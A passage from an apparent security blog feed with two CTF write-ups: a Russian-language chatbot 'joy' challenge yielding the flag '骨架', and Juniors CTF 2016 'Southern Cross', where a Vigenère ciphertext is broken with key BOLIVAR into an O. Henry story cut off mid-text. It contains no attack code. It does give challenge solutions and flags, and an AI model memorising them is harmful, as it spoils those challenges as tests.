<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Me:</div><div class="line">Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)</div><div class="line"></div><div class="line">mabel:</div><div class="line">Флаг? Нелегально? Я легализую всё, что только можно!&quot; (Flag? Illegally? I legalize everything that is possible!)</div><div class="line">Ой, забыла предстваиться. (Oh, I forgot to introduce myself.)</div><div class="line">Привет, я Мэйбл. Мне двенадцать. (Hi, I&apos;m Mabel. I was twelve.)</div><div class="line">У меня есть waddles. Хотите пожениться? (I have waddles. Want to get married?)</div></pre></td></tr></table></figure>
<p>waddles:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Me:</div><div class="line">Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)</div><div class="line"></div><div class="line">waddles:</div><div class="line">Флаг: 骨架 (Flag: 骨架)</div><div class="line">Досвидания. (Bye.)</div></pre></td></tr></table></figure>
<p>And <code>骨架</code> in chinese means <code>skeleton</code>.</p>
<p>We must submit the flag in chinese, not in english.</p>
<p><strong>Note</strong>: Jabber server was very unstable and we get a lot of <em>Lost connection.</em> messages. So we used <code>/reconnect 1</code>.</p>
<p><strong>Feedback</strong>: russian content everywhere, taht’s pain for non-russian people, use english only. No flag format, flag are meaningless so it may be hard to know when you get the flag or not, they need to use a flag format or give in the description what the flag have to look like. This was a joy only challenge, there is no security in this challenge, so that must not be in a CTF or that should give very few points.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="joy" scheme="http://rawsec.ml/tags/joy/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 300 - Southern Cross - Cryptography</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-crypto-southern-cross/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-crypto-southern-cross/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T21:54:59.188Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: crypto</p>
<blockquote>
<ul>
<li>Wow, what’s this, Soos?</li>
<li>It’s the Confederacy’s cipher disk with a help of which southerners encrypted their messages.</li>
<li>How does it work?</li>
<li>Look, Dipper. We need to encode the phrase MABLE EATS SPRINKLES. We don’t need any spaces so just delete them. We get MABLEEATSSPRINKLES. Then we have too choose a key. Let it be GRAVITY. And let’s go !!!</li>
</ul>
<p><a href="https://youtu.be/Fpzrs-fcNKM" target="_blank" rel="external">https://youtu.be/Fpzrs-fcNKM</a></p>
<p>You see, we’ve encrypted the phrase and here it is RBZTXYZJSKZBLQCEN</p>
<ul>
<li>Cool!</li>
<li>Now I’ll encode a famous story and you’ll try to decode it. By the way, it’s much more interesting to read the whole story over, isn’t it?<br>….</li>
<li>That’s complicated. Maybe I have to find a key at first. I’d better look for someone who is able to solve this…</li>
<li>Don’t forget to reach to the end of the text! The ending is greatly important.</li>
</ul>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Mmmh, it sounds like polyalphabetic substitution cipher, it looks like Vigenere.</p>
<p>We have additional proofs, title is <code>Southern Cross</code> making a reference to the <code>Confederate cipher disks used in the Civil War</code> [<a href="http://ciphermachines.com/vigenere" target="_blank" rel="external">1</a>].</p>
<p>The ciphertext is:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UKPVOYDJZPAREJUCQBPCJPBEPZSLOGPBZXGSSDANTFQDPLVTRUOYSOOKBYPWIWRUSCJZSZESDBCERRIPWPSRERTBDOEUVPMIGZOSZNOHRUTLUJUJGZJMMATRITZZDJPAPWOHVSHSQIGJUVLBREIFBZBBOFETZZDTNIWWMOHVGWCMHAEXODTJWVSWYOOHVGSPLDNXICDMWOSUWOJVLCTVLZFDFEGZVVNUBEFIMTVSPCMYCIFSVQIDZBBNIGLVEXZPIBZHRZOXLZNPPLJNKISPVBIEFOYLNHFXSOBCEVOUTVZEIUVCMZRFVBOWMIWJQPADNGJSNMNOWPFOVVNTFHSIOTYFMNIMRZFREPZSVPFTNDCVTGZQHPIFGDMYTYFSYODNVFFHQOHKISTZKOJTWMQGIKJSDBCAKISCIDSVEPZBCHRORDQIAXFGECMEJVQSINATDCXXVNZFGEPZEABQFTVTZPBOWOECMOEBCETSWDXXODNOYLJFJIOCSYOUTCYECONBGWMVDVSCQBCERUHLKFIEHTZZXEKISPVBIEFSCLZSTFBOMYTFUVPOMOLORLVYUEDCFXGEUUVPMIGZOSLVYTVORPZOHVOXZPIBZHRZOKEIDVPLPPFOHSMXORMGAWMTZWSWGCECEHHWBUETIAWITYFSYODNVEFTDZRROREPZFZSSXIIAEEGFOBEJUSOBCAKUVPGMUEUVPMIGZOSQQATPZOCLNANBMLVYTYFFPIRAZUTFZOHVSCCLZRJTVLZFDFEGZVVNUCCMBDDSBZWAXOIOWYOOOGVHDCXHCPKRZVDVPFPINTYFDLANEEHSCAOHIPIRPOHVNWWTNTIVQVWPTWPFEPZRZDVAWXKVUCQBCEVYDCMNSTBFEPZYWPIYLOHVNSDAZNXFFDMMEEFWYBCESFZTMATYBHEPZSLOGPBZXGSSDARAJUOVQIGFOBZBCIEHAZZZSKJAFTVTZOULVYDROUPZJUJUVLVVQLBDFZVWYJZPJJBNBGVVJCBJBRBCIJJRPIJUKPTSQNHVBRHQOHKISMCOTVORZNCIJTWIACOFUSCACAILRZLNOEXODIGRVBRJLJSZOUEPZEOQFPANCRSGLNZWZUVOGIADJHPBCEJBTPMSPCPRPLOOKISECIEFG30000OWTBOCEOYLXUISSYKTTYFDLANEEHSCAOHIVGEBCEZSVPIYSTBGFIGLPPIEWATYFKTVYONTHZTJOBGCCBCEKIIYLZRTMCFLOHVDCYLPCKPFUMMKVEOEBCESFZWZJPVXVTKCSRHUPLYONOZZWNERORFVMEJJGEQIGRUVTAOUXTVLZFDFEGZVVNUCCMBDDSBZWEDTYUVPQMBFPHJQIAJUCFBXAEWODJVGKVAMTZDFVHZNOHVFLAZZSJDOCIIDIBBLEFWRSRWGDNKISTZCIXIVPMGEUCCZBNTFUVPMIGZOSEPZEEHWYMZRJVZWMILPBBRZTBLUKTAZRROHSMZNXJBPIXCFSRTVBTFPFOMMSIBDTLGYRXOJNMODUVPQIEIUHCIDNSVHMMAOIFHSQNWRTONKJMGMWDPZDKISPFKRVTGXMNSVOUPZMETPJPZZDWSCXJJBKJRMIGLJQSCAPAUFFEWIELUFLTDTPKIXXZDFVHZNCIJDOCEDTYBKTVXHVTHPZMIWMSLVYTFPYLBMITLWYBCEXBAPUMJFIBMQBDFHGTBOIEHCYBCETPOWBZNUFFFVRIKUWYOGYDBRPIRRFOUWMVDSZUTDDNXBBTUDTRUWZVJFRUOCOZTROREPZMVTGPVBEIUFFUKEUIWXEDTYBPLTGEOBQETTBVUKPMIHZTGSWPLUFFMTVDVTHSMXRVFYNPZVRMWPZJFZORFAORPSCWTZDFGTEWOHVHFZCIDKIIDQICIFODQIGKISDPVRVPTSQNCFNFLLZSZOHSMGOFUPJWIEJJLEPZATIHHWHICFGQZJMKISEIIKKISPVBIEFSCEVSFSRPZZDKPGEWKTYFFZJWEITKLDZDRESQQVNKBRTMPAEEDWCIGVERZEITYFGEMZPJMCAMDNKPHSMOHZDYHWJDJUVLBGIEFREPZTIBQVNDVVNWYCOEJPTNZVSYJBRBCRFVUSIOHZDYPBJFTIOAIMRRMPCWPGYUHSMHTFPDPVROFEGHPZRVUVCMZHFSGPAREIFHTMYTFMCHPVNXJBRJMAEDVPAJNVXODEVIKJBRNJRAPVYJDGUPUHPJWFVZOVZVVSFTLZBPOWRPOOIEOJIBAZOHSQNAEJALTOHVSCMJZRJEWGMNTVECQAVDUMSLVYBIJRWMVNUTSENMEVUVPGHOLOHPLOHVPHSMMTNPKTBCTYFPLOVCIPGDWIEGPAXMGAEEFZLZFRTHLVYWZUVOQNCIFHTWITYSCFOCTYFTZZZSKBBOCKAGSWXMQACMCYMGYXPFRMCEIFHSMVNZNOWBCAKCCCMWOSUWOJVLCTZTXKEUPBLUJSJZPZCGDVSOYLWRFLSLNJRVMSRBCEPTVZBCIDUVCWPGYUVPPZAUBHZVXERORDIODFXBEWCOCEONWPNTJZZNALZHVEUVDVTSNCMEWPFEPZPIFGPVOBPUVPBJRKVCFAORRJZEPZYYBREZVVVMZPLOHVRIPAOIFOCQBDMVXODVJLFOUPZNOSJUXIIYDJZPAVNUICFZNLRZPPBREVOHSMHAEEHSMNPIZSDBKOJTSEPVTTPIWLAOCMCHACAILRZLNOETVZZNENJHSBMAZMWYOMOGFOYLYRFQDPLWRZEZPXVNKFRLVYCIPDAMYTYBBVNPLCZCQBCEXSODAVLFOUEPZSKSSLUDNKISRWMGVCCMBDDSBZWWKEEFREPZSRDYOZZWFVHOWPBCFVLVYFLMGZNOHVOSLBKATLORMNOWDICZZNTZOYLOHVPBPAVCBPTRWGDRORNPPCBMSOEDTYUVPOGEVPTLKCICEGLGTOLPZOLJUSMSOMXKVEDTZVTVISNIGLVEXZGAUCMMEWYOUTCYGJUJBWOEZCFVZOLJIKZCFOJTRISLLAOIGWYIICZOUEPVTBOCNSNTYFVZZISFGTZNVNPUVTVBIEBFTHJNRXVLBVRVXSRWDNXUCOWVBFVHLPJSJGCCGJUSPPHMVIEUUZBGOEHHZEVIKISCMOHVZZWJZOEPICBMAZMPPNJRVEOJTDGYUWYBCEDPFYQIOYJUFMNSKIOEKVYLTSZNTOLSBWTXAISMOWPBCFTZZVWYJZPIISNFFPLOHVTOYOPIEFPZJRECMOYVZXKISQQMSKBBTUVLNFQZUZATSCDAWYAJBRWZSNFALLZAYBIWLDDEUKPIXCFSRTVOOKISXIMKJPBEPDSDPBPGOHVSSD3000015000IKIVDSTBNSYPFEWAWYBHTMSPVDHPLNAZEGSIMKUPRDWIKZDYTVBSFGHWGVTKISAIXKRHSDEDTYUVPBJEFGVTAWOFUOYLOHVOVPTJOBFRAMISZWSWGVTKISHMOSZESDWAHZTHTZZDYPFDMJLUCCWQQAITATOCTPOWRPKLRZSOWPTYFGLQYSCPKWGDWZTVEPVTJPFCMGOWZCFZNHREBEOJTYVFEAJDFJGLQYBFCVPIMTZMMMCOIKDOYBWEYFZAMYBFMWGIMSXPHATZNKZCQJJTKPASMGLXFHFAWOKITLZZNFVUSBJGVUTCMNHDPIYBNDROUTBNHRSYTKVNKISWXOHZOYTVCONGIYVTIKJGEPVTROSLAOEIOSCTDKVZCFKVNTPAPWPTYFFPIIDXJJPCNWVTHPZIFVMZZENCRSRDIIDJQOOMNIEUVPLZSGFFLLJBLTWYMNSNIOEXVRKPTEPZERTHHINYFVTCWHAEZKLGIENZCCSNTRUSDIDDJIOCSYOUTCYADTKJBRLJWEPBLJJUCESCIIDTISHQIGRUKTODWRTPZZIOEBTLZHIEVZDBZRTPIYBTIIBBLEVYWSCXPJMVXVPVDWRTGPDZNKFSYQOWRTOYIXCZESYBHYTPATVBWVTHTEVSNBZVQIACPBRBCEIPOOEDTYNMNTJTYFGTVVBLORWMHABJBQWMNVXMZZFCZUMTPVDROWOMVOWHCTVOHVSSLVYMRLWYTJTJPTXWIEPJOWEVYJGSWBGIBFWNWPLUECTBDCRNSEWVPCBQPWIEVWSYQIWYFFPBCEIPOONJRBFRLVYIUJRYBFNFXKSQXHWPFVBJTRLSTAOUUJSOIWOLUWENJRYBZQIIHFVFLVYTYFBTBJOBUVPTZFKIOYLOHRUBTOCTZSIYQITFUVPKVMGPTLEDLUXSDBNHFXHSIOWRTHCIQECMWYIHOEHHSMGIKUZPBJWETOYLDWVOHHMNTNJHSQOIMFCQBZNNPBOMMEUJTTEJUCEBEPVVVUICVZDFVHOQAFVSSYBDFZEHZWFTYFCEPZRIPOOWCIIFQVWIYFVRSIQEVORPLPPRCCFBOHVTOXMNAZEPZJOIUCOWTXHVFFQCGLPQVTTJSFQVTKVLZUOTVOTYFFZIYSNFHLSZIKTKSIOSZOGTLZOWVGEPVTDBYPAPSKVFYWPTKISHITWVECDPVRBECOAJNXPHFXVNUMSLVZDRHOTVNTRUFPMDDRHCZLYERMFLBCEIUVLBNOISSWWAYFVFYPVDEUVFZOHZNGPTABFCVPAVIUBULQIACNCDBKAKISEQXACMMDIHEYFFPIBRVFRMWWHVXODAPRVBTTZNTIBHPSDNUPTLKMONCOTBWUKCCWQQAIISWTKUCMIDBCRFVUSIGLIJUSBMETLCYEZDSFHEMMBVNCGQIOEIOOVOWVTVLZFICMPLOOHZTPZWYLVBUTVVNUXSWTCIKUVPBMAZMTZZCIXISCBDMSFFMWWTZEPLTGRVQZLKZDKISDXJICJBEPZBRHOYLOIVEHSMHOLUVZNDTKJUSBGYNJHSIXOIEKSMIHVMCZSZDLQHSMHOJUDCWHIEFBEWWJVDHEPVTYFGLERAJUVPUPZQMSZNNHRSYOWYSFOG45SMGDLQCYPDMNJHSWPTRXOGMMSKPDJWPRWVBYQISRJRMWWWZUVLOMIEXSRWOTFCSSQOTZOHSMWRVFNPAZTJUWWTNAZEGSIMKPPILQITXPWYBJHZUBZJMEVASMWWIYBHPBJTVMZJWPBLUHSMMERJBEIIYTIOYKZFFSPFBJNVPTFAWOCJJLZCEJQZPVOYKJFPLVNUISNIITTBFCGYOLCZPEZBVFBAIMDJNSLVYYFVGSIMKUPRDWIFFSHSZZEPFOCJJBJBWOYPIVUZJEZVVSWDSZDFVFWQQEJUCRMOHVSHTUZAEEORIDNZWSLTRAPTUTDZYFVODYPAIFRPIGAEEWEPJUXIHJWPWRTOXIIIMFVPIMDJPAPYPEVSGEWMIVTOMWPTPPIDPJOKJBZVZOIUKZUZNZOOAMXUCJOCEVYSVHTVZVVSPPTDEMFRPUIONJTJWPRVKIDBCAMJBLTDTKMSQCIWZUVXMNHRSYACOYFVFRCIUGBBOEZLCHSEWIBFMWGIMAEEJLUJSVJTJWPMVBBEWNHFPHDPJOKZCFJGATLVPIMTVEGZVJFRUOCIITLMODPVRBECOAJNJGONMWOIFOOMZPCZGZZMONGIWTJOBZCFLJNKLBZECONCOOQAEVMVPADGYFRLJJUKUVLBNOISSWWAYFVFYJMERLWYPDSCFUMWWTYFSIXMEJTWZVJNUPRDWISWBQPKCAEHSOQIAEJBDBVNKUCZVZOWDCWLAEIPQTBTMZOUWMYWZUVTVZXFSOMTZCLQWOQOYKISDWPLFGHSMHAETVZEZDZUGPTAFFSOXWHEEUZTSZAEFJTTAATFWYBCENJBOWROWBFPXPTRCZPPJUJFHCCGYSPPEQYBRMZHINNVWSCBJHZUHSMWRVFNPIBAZOHSMYEREZJ45WATYFTLTNEWSWPVYCIBQVMYAEETTTGEUUVPOJRXFKTBCAIPOCBCAKUVPEVLCTVFZGEUCONSRIKIWYLDGEBBEMXHFFGLVYBFMWGIMUEDCYAXIFVGLKXODQZTKZSNJTETTBFSSLEVYKISWINTFGHSMCOCESCAPPFGHSMNUETSEMSPIFGDVJTGVHEWOHVTHCMNSFGQLZMYZOUOWPBCFPFBVSJIOCSYOUTCYOVLCPDPLVWRZHSMROFEGDMZMVEHZNVDVGFZUCIJWWPEOHVSSGWGVVSWYPDSIJUSBCAEEHFZIEUUCEPZCLSJPLVRDPTLUVHFHOYGXHRJFSQNSRERWMRAJTHCIIGVMMFXCOCTHPZZDRORSMJPVOSOPDSVZSDIIDJBKSQNFVFHYWOIETHTZMUGTPFBMEJUWYOLUZFHWGJNKISPLBEFGOBCVRKFFPLJABESDSDADUSWTDNXZCFBCAKECOAJNFGHSMAIINCQLJDJPBOMXKVSKLTGSKSSPBWRFLSCAJPVOSOPDSVZSDXZASPRJBCETPBQQYEEUWLTXLVSYHINSKBBOQIGSZVTAXHRJFSMNIKBHTVBTFTDPIFTYFFPEVSRDCYNPSVEVFUJFNISPTNBVMCHIIDKISDMYAKJJPJPZQPTLVZLVDHCQXFROOSMHPVBPZLTSRJROWYSFOPWQIKZOUTUPSKIOGMAACMSYINLVFDTPVDRNCDBMEDBFVIWLVEFPIHWYBHTADTGFOMWYYDSKTTGIRNGDQMOWUFLKTWZMZTIHSZTCFBNIUFVPPVSTPAPBJSVUHWMCIJESLTDNOZNEPZMRSYPBXALHVEPDMJICCBNIIJTJWPRVNSXJZRPFGTZZMVNPPZRHRUWDFTZHVCEMYAKUCOITPVBPZLTOEFSTOCTPGWGMNIIUVPVOHRUGSQNPIJQPMSCLTSXMNAZEDPIWOUZFLBCEIOSCDJUJMMQWMSGFOVQIGFGWEJPTZWSMMZNKBZVQIGKPKTTGIRNGSMNAEPZONMIVORZNTOLSGXZYOUTCYIIDPPIAZVCKJQLTGYYBJPIXOIOSCQIXPAWEPJUXIHJWPMZHVEBCAKJGTBCOLHVEGJUDJUSBIOKSSXMHBVSHSIOHVTCWLTOLUVPAOOTLOE98QAHVTSEBGEJBHEPZMRSYPBKRZDSTBRICMHLSZEMFFJKZNKISSINIEUVPEJRCEOYLCIJICXMOOFUCOMGIMFFEPZSYBFPAOHVFLAZZSJJCYWIDFEGZVNFRDSNPVNXFRTVVNZOGEIITKPCYMJFTPZONZRFDWEGHIEHZPLRIKIWYMSOIBPWMXUGJRTBTTYFGZCGOWUVPUVNJICHMYIKTSWNAOIBAZUZNKMWVMVNVWWWNVCVJBEPZWZORZEJFRSSACOASMSSWPSVISHQGLJFHETZAKPBPMDGYUMQQQEJBWOLJDJPBMWGIMBFNIINFUQLZMYUPIMTZ</div></pre></td></tr></table></figure>
<p>A statistic analysis give us <code>BOLIVOR</code> as KEY, that’s nearly the good one.</p>
<p>At the begining of the clear text we can guess <code>TWENTY MILES</code> so by running a known text attack we found the true KEY: <code>BOLIVAR</code>.</p>
<p>So the clear text is:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWENTYMILESWESTOFTUCSONTHESUNSETEXPRESSSTOPPEDATATANKTOTAKEONWATERBESIDESTHEAQUEOUSADDITIONTHEENGINEOFTHATFAMOUSFLYERACQUIREDSOMEOTHERTHINGSTHATWERENOTGOODFORITWHILETHEFIREMANWASLOWERINGTHEFEEDINGHOSEBOBTIDBALLSHARKDODSONANDAQUARTERBREDCREEKINDIANCALLEDJOHNBIGDOGCLIMBEDONTHEENGINEANDSHOWEDTHEENGINEERTHREEROUNDORIFICESINPIECESOFORDNANCETHATTHEYCARRIEDTHESEORIFICESSOIMPRESSEDTHEENGINEERWITHTHEIRPOSSIBILITIESTHATHERAISEDBOTHHANDSINAGESTURESUCHASACCOMPANIESTHEEJACULATIONDOTELLATTHECRISPCOMMANDOFSHARKDODSONWHOWASLEADEROFTHEATTACKINGFORCETHEENGINEERDESCENDEDTOTHEGROUNDANDUNCOUPLEDTHEENGINEANDTENDERTHENJOHNBIGDOGPERCHEDUPONTHECOALSPORTIVELYHELDTWOGUNSUPONTHEENGINEDRIVERANDTHEFIREMANANDSUGGESTEDTHATTHEYRUNTHEENGINEFIFTYYARDSAWAYANDTHEREAWAITFURTHERORDERSSHARKDODSONANDBOBTIDBALLSCORNINGTOPUTSUCHLOWGRADEOREASTHEPASSENGERSTHROUGHTHEMILLSTRUCKOUTFORTHERICHPOCKETOFTHEEXPRESSCARTHEYFOUNDTHEMESSENGERSERENEINTHEBELIEFTHATTHESUNSETEXPRESSWASTAKINGONNOTHINGMORESTIMULATINGANDDANGEROUSTHANAQUAPURAWHILEBOBWASKNOCKINGTHISIDEAOUTOFHISHEADWITHTHEBUTTENDOFHISSIXSHOOTERSHARKDODSONWASALREADYDOSINGTHEEXPRESSCARSAFEWITHDYNAMITETHESAFEEXPLODEDTOTHETUNEOF30000ALLGOLDANDCURRENCYTHEPASSENGERSTHRUSTTHEIRHEADSCASUALLYOUTOFTHEWINDOWSTOLOOKFORTHETHUNDERCLOUDTHECONDUCTORJERKEDATTHEBELLROPEWHICHSAGGEDDOWNLOOSEANDUNRESISTINGATHISTUGSHARKDODSONANDBOBTIDBALLWITHTHEIRBOOTYINASTOUTCANVASBAGTUMBLEDOUTOFTHEEXPRESSCARANDRANAWKWARDLYINTHEIRHIGHHEELEDBOOTSTOTHEENGINETHEENGINEERSULLENLYANGRYBUTWISERANTHEENGINEACCORDINGTOORDERSRAPIDLYAWAYFROMTHEINERTTRAINBUTBEFORETHISWASACCOMPLISHEDTHEEXPRESSMESSENGERRECOVEREDFROMBOBTIDBALLSPERSUADERTONEUTRALITYJUMPEDOUTOFHISCARWITHAWINCHESTERRIFLEANDTOOKATRICKINTHEGAMEMRJOHNBIGDOGSITTINGONTHECOALTENDERUNWITTINGLYMADEAWRONGLEADBYGIVINGANIMITATIONOFATARGETANDTHEMESSENGERTRUMPEDHIMWITHABALLEXACTLYBETWEENHISSHOULDERBLADESTHECREEKCHEVALIEROFINDUSTRYROLLEDOFFTOTHEGROUNDTHUSINCREASINGTHESHAREOFHISCOMRADESINTHELOOTBYONESIXTHEACHTWOMILESFROMTHETANKTHEENGINEERWASORDEREDTOSTOPTHEROBBERSWAVEDADEFIANTADIEUANDPLUNGEDDOWNTHESTEEPSLOPEINTOTHETHICKWOODSTHATLINEDTHETRACKFIVEMINUTESOFCRASHINGTHROUGHATHICKETOFCHAPARRALBROUGHTTHEMTOOPENWOODSWHERETHREEHORSESWERETIEDTOLOWHANGINGBRANCHESONEWASWAITINGFORJOHNBIGDOGWHOWOULDNEVERRIDEBYNIGHTORDAYAGAINTHISANIMALTHEROBBERSDIVESTEDOFSADDLEANDBRIDLEANDSETFREETHEYMOUNTEDTHEOTHERTWOWITHTHEBAGACROSSONEPOMMELANDRODEFASTANDWITHDISCRETIONTHROUGHTHEFORESTANDUPAPRIMEVALLONELYGORGEHERETHEANIMALTHATBOREBOBTIDBALLSLIPPEDONAMOSSYBOULDERANDBROKEAFORELEGTHEYSHOTHIMTHROUGHTHEHEADATONCEANDSATDOWNTOHOLDACOUNCILOFFLIGHTMADESECUREFORTHEPRESENTBYTHETORTUOUSTRAILTHEYHADTRAVELLEDTHEQUESTIONOFTIMEWASNOLONGERSOBIGMANYMILESANDHOURSLAYBETWEENTHEMANDTHESPRYESTPOSSETHATCOULDFOLLOWSHARKDODSONSHORSEWITHTRAILINGROPEANDDROPPEDBRIDLEPANTEDANDCROPPEDTHANKFULLYOFTHEGRASSALONGTHESTREAMINTHEGORGEBOBTIDBALLOPENEDTHESACKDREWOUTDOUBLEHANDFULSOFTHENEATPACKAGESOFCURRENCYANDTHEONESACKOFGOLDANDCHUCKLEDWITHTHEGLEEOFACHILDSAYYOUOLDDOUBLEDECKEDPIRATEHECALLEDJOYFULLYTODODSONYOUSAIDWECOULDDOITYOUGOTAHEADFORFINANCINGTHATKNOCKSTHEHORNSOFFOFANYTHINGINARIZONAWHATAREWEGOINGTODOABOUTAHOSSFORYOUBOBWEAINTGOTLONGTOWAITHERETHEYLLBEONOURTRAILBEFOREDAYLIGHTINTHEMORNINOHIGUESSTHATCAYUSEOFYOURNLLCARRYDOUBLEFORAWHILEANSWEREDTHESANGUINEBOBWELLANNEXTHEFIRSTANIMALWECOMEACROSSBYJINGOESWEMADEAHAULDIDNTWEACCORDINTOTHEMARKSONTHISMONEYTHERES3000015000APIECEITSSHORTOFWHATIEXPECTEDSAIDSHARKDODSONKICKINGSOFTLYATTHEPACKAGESWITHTHETOEOFHISBOOTANDTHENHELOOKEDPENSIVELYATTHEWETSIDESOFHISTIREDHORSEOLDBOLIVARSMIGHTYNIGHPLAYEDOUTHESAIDSLOWLYIWISHTHATSORRELOFYOURSHADNTGOTHURTSODOISAIDBOBHEARTILYBUTITCANTBEHELPEDBOLIVARSGOTPLENTYOFBOTTOMHELLGETUSBOTHFARENOUGHTOGETFRESHMOUNTSDANGITSHARKICANTHELPTHINKINHOWFUNNYITISTHATANEASTERNERLIKEYOUCANCOMEOUTHEREANDGIVEUSWESTERNFELLOWSCARDSANDSPADESINTHEDESPERADOBUSINESSWHATPARTOFTHEEASTWASYOUFROMANYWAYNEWYORKSTATESAIDSHARKDODSONSITTINGDOWNONABOULDERANDCHEWINGATWIGIWASBORNONAFARMINULSTERCOUNTYIRANAWAYFROMHOMEWHENIWASSEVENTEENITWASANACCIDENTMYCOMINGWESTIWASWALKINALONGTHEROADWITHMYCLOTHESINABUNDLEMAKINFORNEWYORKCITYIHADANIDEAOFGOINTHEREANDMAKINLOTSOFMONEYIALWAYSFELTLIKEICOULDDOITICAMETOAPLACEONEEVENINWHERETHEROADFORKEDANDIDIDNTKNOWWHICHFORKTOTAKEISTUDIEDABOUTITFORHALFANHOURANDTHENITOOKTHELEFTHANDTHATNIGHTIRUNINTOTHECAMPOFAWILDWESTSHOWTHATWASTRAVELLINAMONGTHELITTLETOWNSANDIWENTWESTWITHITIVEOFTENWONDEREDIFIWOULDNTHAVETURNEDOUTDIFFERENTIFIDTOOKTHEOTHERROADOHIRECKONYOUDHAVEENDEDUPABOUTTHESAMESAIDBOBTIDBALLCHEERFULLYPHILOSOPHICALITAINTTHEROADSWETAKEITSWHATSINSIDEOFUSTHATMAKESUSTURNOUTTHEWAYWEDOSHARKDODSONGOTUPANDLEANEDAGAINSTATREEIDAGOODDEALRATHERTHATSORRELOFYOURNHADNTHURTHIMSELFBOBHESAIDAGAINALMOSTPATHETICALLYSAMEHEREAGREEDBOBHEWASSUREAFIRSTRATEKINDOFACROWBAITBUTBOLIVARHELLPULLUSTHROUGHALLRIGHTRECKONWEDBETTERBEMOVINONHADNTWESHARKILLBAGTHISBOODLEAGINANDWELLHITTHETRAILFORHIGHERTIMBERBOBTIDBALLREPLACEDTHESPOILINTHEBAGANDTIEDTHEMOUTHOFITTIGHTLYWITHACORDWHENHELOOKEDUPTHEMOSTPROMINENTOBJECTTHATHESAWWASTHEMUZZLEOFSHARKDODSONS45HELDUPONHIMWITHOUTAWAVERSTOPYOURFUNNINSAIDBOBWITHAGRINWEGOTTOBEHITTINTHEBREEZESETSTILLSAIDSHARKYOUAINTGOINTOHITNOBREEZEBOBIHATETOTELLYOUBUTTHEREAINTANYCHANCEFORBUTONEOFUSBOLIVARHESPLENTYTIREDANDHECANTCARRYDOUBLEWEBEENPARDSMEANDYOUSHARKDODSONFORTHREEYEARBOBSAIDQUIETLYWEVERISKEDOURLIVESTOGETHERTIMEANDAGAINIVEALWAYSGIVEYOUASQUAREDEALANDITHOUGHTYOUWASAMANIVEHEARDSOMEQUEERSTORIESABOUTYOUSHOOTINONEORTWOMENINAPECULIARWAYBUTINEVERBELIEVEDEMNOWIFYOUREJUSTHAVINALITTLEFUNWITHMESHARKPUTYOURGUNUPANDWELLGETONBOLIVARANDVAMOSEIFYOUMEANTOSHOOTSHOOTYOUBLACKHEARTEDSONOFATARANTULASHARKDODSONSFACEBOREADEEPLYSORROWFULLOOKYOUDONTKNOWHOWBADIFEELHESIGHEDABOUTTHATSORRELOFYOURNBREAKINHISLEGBOBTHEEXPRESSIONONDODSONSFACECHANGEDINANINSTANTTOONEOFCOLDFEROCITYMINGLEDWITHINEXORABLECUPIDITYTHESOULOFTHEMANSHOWEDITSELFFORAMOMENTLIKEANEVILFACEINTHEWINDOWOFAREPUTABLEHOUSETRULYBOBTIDBALLWASNEVERTOHITTHEBREEZEAGAINTHEDEADLY45OFTHEFALSEFRIENDCRACKEDANDFILLEDTHEGORGEWITHAROARTHATTHEWALLSHURLEDBACKWITHINDIGNANTECHOESANDBOLIVARUNCONSCIOUSACCOMPLICESWIFTLYBOREAWAYTHELASTOFTHEHOLDERSUPOFTHESUNSETEXPRESSNOTPUTTOTHESTRESSOFCARRYINGDOUBLEBUTASSHARKDODSONGALLOPEDAWAYTHEWOODSSEEMEDTOFADEFROMHISVIEWTHEREVOLVERINHISRIGHTHANDTURNEDTOTHECURVEDARMOFAMAHOGANYCHAIRHISSADDLEWASSTRANGELYUPHOLSTEREDANDHEOPENEDHISEYESANDSAWHISFEETNOTINSTIRRUPSBUTRESTINGQUIETLYONTHEEDGEOFAQUARTEREDOAKDESKIAMTELLINGYOUTHATDODSONOFTHEFIRMOFDODSONDECKERW